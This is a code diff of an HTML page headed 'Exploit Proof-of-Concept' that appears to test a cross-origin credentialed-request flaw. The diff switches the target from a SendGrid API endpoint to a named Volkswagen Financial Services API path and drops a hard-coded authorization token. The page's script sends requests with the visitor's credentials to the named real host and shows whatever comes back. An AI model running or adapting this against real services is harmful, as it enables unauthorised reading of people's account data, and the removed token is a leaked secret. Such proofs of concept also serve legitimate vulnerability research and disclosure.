@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>api.sendgrid.com/v3/accounts/offerings</code></p>
+    <p>Target: <code>b1.api.kons.antrag.vwfs.de/vollmachten</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -29,7 +29,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://api.sendgrid.com/v3/accounts/offerings?_show&_pricing&_offerings";
+        const target = "https://b1.api.kons.antrag.vwfs.de/vollmachten";
 
         statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
@@ -40,7 +40,6 @@
             headers: {
                 "Accept": "application/json",
                 "Content-Type": "application/json",
-                "Authorization": "token SHDWFUX5JBEN5YXJ.IKDTDTFZSCPOZTKUKIXTV4ZEW42SKJIGCN2WADVRQVJEWOS63HXUU5EF6NSHJVEL4FXHBLP7ELMNMM2JRIND43IG"
             }
         })
         .then(response => {
